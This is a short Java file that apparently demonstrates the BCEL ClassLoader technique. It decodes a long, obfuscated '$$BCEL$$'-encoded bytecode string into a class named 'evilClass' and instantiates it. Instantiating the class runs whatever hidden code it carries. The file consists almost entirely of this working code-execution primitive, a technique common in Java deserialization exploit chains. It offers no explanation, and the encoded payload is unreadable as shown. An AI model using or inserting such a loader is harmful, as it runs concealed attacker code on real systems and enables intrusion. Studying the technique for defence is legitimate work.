package ClassLoad;

import com.sun.org.apache.bcel.internal.util.ClassLoader;

public class BCELLoader {
    public static void main(String[] args) throws Exception {
        ClassLoader loader = new ClassLoader();
        Class evilClass = loader.loadClass("$$BCEL$$" + "$l$8b$I$A$A$A$A$A$A$AmQMO$db$40$Q$7d$9b8ql$iHB$D$v$fd$o$7c$s$i$eaKoA$5cP$x$n$dc$a6j$a2$a0$k7$9b$r$d9$60ld$3b$c0$3f$ea$99K$5b$V$89$de$fb$a3Pg$dd$u$a4$CK$de$d9y$ef$cd$9b$d9$dd$3f$f7$bf$ee$A$bcC$c3$86$85$9a$8d$e7X$x$e0$85$8e$_M$bc2$f1$daF$koL$ac$9b$a83$e4$f7U$a0$92$D$86l$a3$d9c0$O$c3$81dX$f2T$m$3fM$ce$fb2$ea$f2$beOH$c5$L$F$f7$7b$3cR$3a$9f$82F2R1C$c9$3b$f4y$i$7b$n$l$b8$f2R$f9$z$86$c2$be$f0$a7$c6$8c$84Uo$cc$_$b9$abB$f7$a8$fd$feZ$c8$8bD$85$B$c9$8a$9d$84$8b$b3$8f$fc$o5$a4$f1$Y$ecN8$89$84$fc$a0t$DK$db$bd$d5$b5$Ol$y$98$d8p$b0$89$z$eaL$c3$I$H$db$d8aX$7e$c2$9ba$zE$7d$k$M$dd$_$93$mQ$e7rFj$af$5d$86$c5$ff$a7$a6s$3c$94$b4$fbc$v$S$86$f2$p$X$9ap$u$93YRm4$bdG$g$3a$99$n$af$a5$60$d8m$cc$b1$9d$qR$c1$b05_$f09$K$85$8cc$w$a8$cd$x$bb$a3$u$bc$d2W$d2j$f6PG$81$5eR$7f$Z0$7d$N$b4$3a$94$b9$U$Z$c5$dc$de$P$b0$9b$94$$$d2$9a$ff$Hb$91Vg$ba_B$89b$B$e5Y$f1$v$b2$v$b7$fa$T$99J$f6$3b$8c$93o$u$k$df$o$ff$95$dc$cc$df7$vi$914GBm$bbB$3b$a4$93$y$Qj$Rf$T$e6$cc$da$U$J$ab$60$99$b2g$f4$9b$c8x$s$aa$W$R$x$e9d$ab$7f$B$d6$u$Q$V$98$C$A$A");
        evilClass.newInstance();
    }
}
